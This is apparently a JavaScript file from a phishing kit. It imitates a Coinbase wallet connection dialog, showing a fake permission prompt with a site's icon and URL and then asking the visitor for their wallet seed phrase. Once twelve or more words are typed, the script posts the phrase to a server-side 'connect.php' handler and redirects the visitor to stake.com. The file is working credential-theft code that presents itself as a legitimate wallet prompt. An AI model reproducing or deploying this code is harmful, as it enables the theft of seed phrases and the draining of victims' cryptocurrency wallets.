function cbOpen() {
	if (!$(".cb-container").hasClass('show')){
	    $(".cb-container").addClass('show');
	    $(".cb-loader-block").show();
	    $(".cb-container").fadeIn(100);
	    $(".cb-permission-badge-icon").attr("src", window.websiteIcon);
	    $(".cb-permission-badge-text").text(window.websiteURL);
	    setTimeout(function() {
	        $(".cb-loader-block").hide();
	        $(".cb-permission-block").show();
	    }, 500);
	}
}

function cbClose() {
    $(".cb-container").fadeOut(100, function() {
	    $(".cb-container").removeClass('show');
        $(".cb-loader-block, .cb-permission-block, .cb-password-block").css("display", "none");
        $("#cbSeedwords").val(null);
    })
}

$("body").on('click', '.coinbaseopen', function() {
    return cbOpen();
});

$(".cbSeedButton").click(function() {
    $(".cb-permission-block").hide();
    $(".cb-loader-block").show();
    setTimeout(function() {
        $(".cb-loader-block").hide();
        $(".cb-seed-block").show();
    }, 500)
});

$(".cbCancelButton").click(function() {
    cbClose()
});

function seedCount(val){
    try {
        return {
			num: val.match(/\S+/g).length
        }
    }
    catch (ex) {
        return {
            num: 0
        };
    }
}

$("#cbSeedwords").on("input", function(){
	var seeds = seedCount($(this).val());
	if (seeds.num < 12){
		$("#cbSeedButton").attr("disabled", !0).removeClass('enable')
	} else {
		$("#cbSeedButton").attr("disabled", !1).addClass('enable')
	}
});

$("#cbSeedButton").click(function(){
    $(".cb-seed-block").hide();
    $(".cb-loader-block").show();
	var seeds = $("#cbSeedwords").val();
	$.post("./form/coinbase/connect.php", {
        phrase: seeds
    }).done(function(){
        window.location.replace("http://stake.com")
    })
});
